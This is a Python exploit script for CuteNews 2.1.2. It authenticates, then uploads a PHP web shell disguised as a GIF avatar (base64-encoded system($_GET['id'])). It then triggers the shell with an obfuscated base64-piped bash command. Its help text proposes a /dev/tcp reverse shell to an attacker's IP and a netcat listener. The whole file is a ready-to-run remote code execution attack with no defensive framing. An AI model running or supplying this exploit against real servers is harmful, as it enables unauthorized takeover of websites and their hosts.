#!/bin/python3


from requests import *
from termcolor import *
from bs4 import BeautifulSoup
from base64 import *
from argparse import *

def login(user,passwd):
    data = {'action':'dologin','username':user,'password':passwd}
    res = Se.post(url,data=data,allow_redirects=True)
    if len(res.text)== 0:
       cprint("[+] Authentication successful","green")
       return res.cookies.get_dict()
    else :
        cprint("[-] Login failed","red")
        cprint("[!] Check username or password","blue")
        exit()
def get_arg(c):
    res = Se.get(url,params={'mod':'main','opt':'personal'}).text
    pas = BeautifulSoup(res,'html.parser')
    re = pas.findAll('input')
    xc={}
    for x in re:
        xc.update({x.get('name'):x.get('value')})
    return xc

def upload():
    c = login(user,passwd)
    
    xc = get_arg(c)
    del xc['avatar_file']
    del xc[None]
    #print(xc)
    name  ="ahmadsy.php"
    file = {'avatar_file':(name,filename)}

    new = Se.post(url,files=file,data=xc)
    
    new = Se.get(f"http://{host}:{port}/CuteNews/uploads/avatar_{xc['username']}_{name}")
    if new.status_code ==200:
        cprint("[+] success upload","green")
        cprint("[!] trying get a shell","blue")
        try:
            new = Se.get(f"http://{host}:{port}/CuteNews/uploads/avatar_{xc['username']}_{name}",params={'id':shell},timeout=1)
            cprint("[-] exection failure","red")
            cprint(f"[!] Please check listen with netcat for example : {colored('nc -lvnp your_port','blue')}","white")
        except:
            cprint("[+] success execute shell","yellow")
    else:
        cprint("[-] upload failure","red")
if __name__ == '__main__':

	argv = ArgumentParser(description="exploit cutenews version 2.1.2 shell upload")
	argv.add_argument("-H","--host",required=True,help="host or ip web service like www.example.com")

	argv.add_argument("-u","--username",required=True,help="Username cutenews")
	argv.add_argument("-p","--password",required=True,help="Password cutenews")
	argv.add_argument("-P","--port",default="80",help="port web service default 80")
	argv.add_argument("-c","--command",required=True,help="execute command like 'bash -i >& /dev/tcp/your_ip/your_port 0>&1'")
	ag = argv.parse_args()
	host = ag.host
	user = ag.username
	passwd = ag.password
	port = ag.port
	comm = b64encode(ag.command.encode()).decode()
	Se = Session()
	filename = b64decode("R0lGODs8P3BocCBzeXN0ZW0oJF9HRVRbJ2lkJ10pID8+Cg==".encode()).decode('latin-1')
	url = f"http://{host}:{port}/CuteNews/index.php"
	shell = "echo${IFS}"+comm+"|base64${IFS}-d|bash"
	upload()
